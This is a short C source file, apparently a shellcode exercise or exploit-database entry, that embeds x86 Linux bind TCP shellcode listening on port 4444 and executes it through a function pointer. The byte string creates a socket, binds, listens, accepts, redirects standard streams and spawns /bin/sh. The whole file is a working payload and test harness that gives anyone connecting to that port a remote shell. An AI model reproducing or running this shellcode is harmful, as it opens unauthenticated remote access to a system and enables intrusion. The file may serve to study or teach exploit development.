// Filename: shellcode.c
// Author:   Elham AlShehri
// Purpose:  Execute Bind TCP Shellcode
#include<stdio.h>
#include<string.h>

#define PORT "\x11\x5c" // port 4444 ==> 115c


unsigned char code[] ="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x51\x41\x51\x41\x51\xb0\x66\x43\x89\xe1\xcd\x80\x89\xc6\x52\x66\x68" PORT 
"\x43\x66\x53\x89\xe1\x6a\x10\x51\x56\x31\xc0\xb0\x66\x89\xe1\xcd\x80\x4b\x53\x56\x31\xc0"
"\xb0\x66\x80\xc3\x03\x89\xe1\xcd\x80\x52\x52\x56\x31\xc0\xb0\x66\x43\x89\xe1\xcd\x80\x89"
"\xc3\x31\xc9\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd\x80\x41\x31\xc0\xb0\x3f\xcd"
"\x80\xeb\x18\x5e\x88\x56\x07\x8d\x1e\x89\x56\x08\x8d\x4e\x08\x89\x56\x0c\x8d\x56\x0c\x31"
"\xc0\xb0\x0b\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43";

int main()
{
	printf("Shellcode Length:  %d\n", strlen(code));
	int (*ret)() = (int(*)())code;
	ret();
}